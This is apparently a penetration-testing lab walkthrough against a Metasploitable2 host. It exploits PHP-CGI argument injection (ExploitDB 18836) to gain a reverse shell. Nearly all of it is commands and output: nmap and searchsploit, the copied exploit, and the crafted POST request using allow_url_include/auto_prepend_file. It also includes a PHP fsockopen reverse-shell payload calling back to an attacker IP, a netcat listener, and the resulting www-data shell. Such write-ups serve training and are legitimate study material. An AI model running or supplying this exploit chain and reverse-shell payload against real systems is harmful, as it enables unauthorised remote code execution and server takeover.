# Targeting PHP

```sh
root@attackdefense:~# nmap -sC -sV -p 80 10.5.28.46
Starting Nmap 7.92 ( https://nmap.org ) at 2024-01-15 13:35 IST
Nmap scan report for demo.ine.local (10.5.28.46)
Host is up (0.0029s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) DAV/2)
|_http-title: Metasploitable2 - Linux
|_http-server-header: Apache/2.2.8 (Ubuntu) DAV/2

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.01 seconds
```

<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

```sh
root@attackdefense:~# searchsploit php cgi
---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Apache + PHP < 5.3.12 / < 5.4.2 - cgi-bin Remote Code Execution                                                                                           | php/remote/29290.c
Axis Network Camera 2.x And Video Server 1-3 - HTTP Authentication Bypass                                                                                 | cgi/webapps/24402.php
Citrix CloudBridge - 'CAKEPHP' Cookie Command Injection                                                                                                   | cgi/webapps/42346.txt
cPanel WebHost Manager 3.1 - 'addon_configsupport.cgi?supporturl' Cross-Site Scripting                                                                    | php/webapps/29183.txt
Freeside SelfService CGI/API 2.3.3 - Multiple Vulnerabilities                                                                                             | php/webapps/19598.txt
K-COLLECT CSV_DB.CGI 1.0/i_DB.CGI 1.0 - Remote Command Execution                                                                                          | php/webapps/25904.c
MRCGIGUY Amazon Directory 1.0/2.0 - Insecure Cookie Handling                                                                                              | php/webapps/8685.txt
MRCGIGUY ClickBank Directory 1.0.1 - Insecure Cookie Handling                                                                                             | php/webapps/8682.txt
mrcgiguy freeticket - Cookie Handling / SQL Injection                                                                                                     | php/webapps/8926.txt
MRCGIGUY Hot Links - 'report.php?id' SQL Injection                                                                                                        | php/webapps/8918.txt
MRCGIGUY Hot Links SQL 3.2.0 - Insecure Cookie Handling                                                                                                   | php/webapps/8684.txt
MRCGIGUY Message Box 1.0 - Insecure Cookie Handling                                                                                                       | php/webapps/8686.txt
MRCGIGUY SimpLISTic SQL 2.0.0 - Insecure Cookie Handling                                                                                                  | php/webapps/8692.txt
MRCGIGUY The Ticket System 2.0 - Insecure Cookie Handling                                                                                                 | php/webapps/8687.txt
mrcgiguy the ticket system 2.0 PHP - Multiple Vulnerabilities                                                                                             | php/webapps/8917.txt
MRCGIGUY Thumbnail Gallery Post 1b - Arbitrary File Upload                                                                                                | php/webapps/9086.txt
MRCGIGUY Top Sites 1.0.0 - Insecure Cookie Handling                                                                                                       | php/webapps/8694.txt
MRCGIGUY Ultimate Profit Portal 1.0.1 - Insecure Cookie Handling                                                                                          | php/webapps/8688.txt
PHP 5.3.12/5.4.2 - CGI Argument Injection (Metasploit)                                                                                                    | php/remote/18834.rb
PHP 5.5.9 - 'zend_executor_globals' 'CGIMode FPM WriteProcMemFile' disable_functions Bypass / Load Dynamic Library                                        | php/webapps/38127.php
PHP < 5.3.12 / < 5.4.2 - CGI Argument Injection                                                                                                           | php/remote/18836.py
PHP PHP/fi 2.0 - Directory Traversal                                                                                                                      | cgi/remote/20567.txt
phpBB 2.0.10 - Remote Command Execution (CGI)                                                                                                             | php/webapps/673.pl
QuickCommerce 2.5/3.0 / Cart32 2.5 a/3.0 / Shop Express 1.0 / StoreCreator 3.0 Web Shopping Cart - Hidden Form Field                                      | cgi/remote/19951.php
Simple PHP Blog 0.4 - 'colors.php' Multiple Cross-Site Scripting Vulnerabilities                                                                          | cgi/webapps/26463.txt
Simple PHP Blog 0.4 - 'preview_cgi.php' Multiple Cross-Site Scripting Vulnerabilities                                                                     | cgi/webapps/26461.txt
Simple PHP Blog 0.4 - 'preview_static_cgi.php' Multiple Cross-Site Scripting Vulnerabilities                                                              | cgi/webapps/26462.txt
SysInfo 1.21 - 'sysinfo.cgi' Remote Command Execution                                                                                                     | cgi/webapps/1677.php
WebAPP 0.9.9.2.1 - Remote Command Execution (2)                                                                                                           | cgi/webapps/1004.php
---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

```sh
root@attackdefense:~# searchsploit -m 18836
  Exploit: PHP < 5.3.12 / < 5.4.2 - CGI Argument Injection
      URL: https://www.exploit-db.com/exploits/18836
     Path: /usr/share/exploitdb/exploits/php/remote/18836.py                                                                                                                                
File Type: Python script, ASCII text executable                                                                                                                                             
                                                                                                                                                                                            
Copied to: /root/18836.py
```

<figure><img src="../../.gitbook/assets/Screenshot from 2024-01-15 13-43-49.png" alt=""><figcaption></figcaption></figure>

```php
$sock=fsockopen("IP",1234);exec("/bin/sh -i <&3 >&3 2>&3");
```

<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

```sh
root@attackdefense:~# nc -nvlp 1234
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
```

```sh
root@attackdefense:~# python2 18836.py 10.5.28.46 80
POST /?-dallow_url_include%3don+-dauto_prepend_file%3dphp://input HTTP/1.1
Host: 10.5.28.46
Content-Type: application/x-www-form-urlencoded
Content-Length: 76

<?php $sock=fsockopen("10.10.19.2",1234);exec("/bin/sh -i <&3 >&3 2>&3"); ?>

'HTTP/1.1 200 OK\r\nDate: Mon, 15 Jan 2024 08:19:27 GMT\r\nServer: Apache/2.2.8 (Ubuntu) DAV/2\r\nX-Powered-By: PHP/5.2.4-2ubuntu5.10\r\nContent-Length: 0\r\nContent-Type: text/html\r\n\r\n'
root@attackdefense:~# 
```

```sh
root@attackdefense:~# nc -nvlp 1234
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.5.28.46.
Ncat: Connection from 10.5.28.46:49532.
root@attackdefense:~# 
```

```php
$sock=fsockopen("10.10.19.2",1234);exec("/bin/sh -i <&4 >&4 2>&4");
```

```sh
root@attackdefense:~# python2 18836.py 10.5.28.46 80
POST /?-dallow_url_include%3don+-dauto_prepend_file%3dphp://input HTTP/1.1
Host: 10.5.28.46
Content-Type: application/x-www-form-urlencoded
Content-Length: 76

<?php $sock=fsockopen("10.10.19.2",1234);exec("/bin/sh -i <&4 >&4 2>&4"); ?>

```

```sh
root@attackdefense:~# nc -nvlp 1234
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.5.28.46.
Ncat: Connection from 10.5.28.46:49556.
sh: no job control in this shell
sh-3.2$ /bin/bash -i
/bin/bash -i
bash: no job control in this shell
www-data@d1d6a9361621:/var/www$ whoami
whoami
www-data
```
